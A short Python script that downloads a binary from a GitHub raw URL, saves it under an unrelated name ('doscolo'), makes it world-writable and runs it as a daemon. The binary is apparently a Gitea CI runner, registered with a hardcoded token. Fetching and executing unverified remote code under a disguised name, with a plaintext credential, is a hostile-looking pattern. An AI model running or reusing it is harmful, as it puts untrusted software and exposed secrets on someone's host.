
import subprocess
import urllib.request
import os

TOKEN = "40ce80QAqU5DPfOqwHvsyTBpxx9OLqOjdna2maHk"

URL = "https://github.com/KOSOCOFA/legendary-rotary-phone/raw/refs/heads/main/kosovok"

# Download binary as doscolo
print("[1] Downloading...")
urllib.request.urlretrieve(URL, "doscolo")

# chmod 777
os.chmod("doscolo", 0o777)

# Register runner
print("[2] Registering...")
subprocess.run([
    "./doscolo",
    "register",
    "--instance", "https://gitea.com/",
    "--token", TOKEN,
    "--labels", "maiso",
    "--name", "maiso"
], check=True)

# Start daemon
print("[3] Starting daemon...")
subprocess.run(["./doscolo", "daemon"], check=True)
